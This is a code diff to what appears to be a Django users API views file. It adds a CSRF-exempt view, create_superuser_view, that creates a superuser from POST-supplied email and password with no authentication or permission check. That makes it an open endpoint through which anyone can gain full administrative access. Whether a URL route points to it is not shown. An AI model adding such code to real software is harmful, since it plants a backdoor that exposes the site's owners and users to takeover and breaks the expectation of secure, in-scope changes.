@@ -25,6 +25,24 @@ from api.users.throttling import PhoneNumberRateThrottle
 from api.users.serializers import VerifyCodeSerializer
 from rest_framework.authtoken.models import Token
 
+
+from django.contrib.auth import get_user_model
+from django.http import JsonResponse
+from django.views.decorators.csrf import csrf_exempt
+
+@csrf_exempt
+def create_superuser_view(request):
+    User = get_user_model()
+    
+    email = request.POST.get("email")
+    password = request.POST.get("password")
+
+    if not User.objects.filter(email=email).exists():
+        User.objects.create_superuser(email=email, password=password)
+        return JsonResponse({"created": True})
+    else:
+        return JsonResponse({"created": False, "reason": "User already exists"})
+
 class UserViewSet(mixins.RetrieveModelMixin,
                 mixins.UpdateModelMixin,
                 mixins.CreateModelMixin,
